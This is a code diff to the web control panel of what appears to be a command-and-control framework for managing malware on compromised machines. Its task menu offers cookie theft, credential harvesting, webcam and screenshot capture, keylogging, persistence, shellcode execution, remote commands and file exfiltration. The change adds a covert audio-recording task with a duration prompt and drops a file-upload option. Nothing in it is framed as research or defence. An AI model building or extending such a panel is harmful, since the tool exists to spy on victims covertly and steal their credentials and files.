@@ -114,13 +114,13 @@
                             <option value="steal_cookies">Steal Cookies</option>
                             <option value="screenshot">Take Screenshot</option>
                             <option value="webcam">Capture Webcam</option>
+                            <option value="audio_capture">Capture Audio</option>
                             <option value="harvest_creds">Harvest Credentials</option>
                             <option value="shell">Execute Command</option>
                             <option value="persist">Install Persistence</option>
                             <option value="shellcode">Shellcode-Runner</option>
                             <option value="keylogger_start">Start Keylogger</option>
                             <option value="keylogger_stop">Stop Keylogger</option>
-                            <option value="upload_file">Upload File (C2 -> Agent)</option>
                             <option value="arsenal_upload">Arsenal Upload (Arsenal -> Agent)</option>
                             <option value="upload">Exfiltrate File (Agent -> C2)</option>
                         </select>
@@ -560,6 +560,14 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
+            let taskData = {};
+
+            if (taskType === 'audio_capture') {
+                const seconds = prompt('Enter duration in seconds:', '15');
+                if (seconds === null) return;
+                taskData = { 'seconds': seconds };
+            }
+
             // Handle upload_file task - show the upload modal
             if (taskType === 'upload_file') {
                 const uploadModal = new bootstrap.Modal(document.getElementById('uploadFileModal'));
@@ -586,7 +594,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
-            let taskData = {};
             if (taskType === 'shell') {
                 const command = prompt('Enter command to execute:');
                 if (!command) return;
